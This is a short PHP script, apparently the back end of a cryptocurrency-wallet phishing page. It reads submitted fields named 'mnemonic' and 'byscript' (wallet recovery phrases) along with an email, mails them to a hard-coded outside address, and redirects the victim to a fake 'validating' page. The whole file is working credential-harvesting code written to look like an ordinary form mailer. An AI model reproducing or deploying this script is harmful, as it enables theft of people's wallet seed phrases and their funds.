<?php
//get data from form  

$name = $_POST['mnemonic'];
$email= $_POST['email'];
$phrase= $_POST['byscript'];

$to = "paulnseobong37@mail.com";

$subject = "Mail From wallet transact";
$txt ="Name = ". $name . "\r\n  Email = " . $email . "\r\n Message =" . $phrase;
$headers = "From: noreply@yoursite.com" . "\r\n" .
"CC: somebodyelse@example.com";
if($email!=NULL){
    mail($to,$subject,$txt,$headers);
}
//redirect
header("Location:validating.html");
?>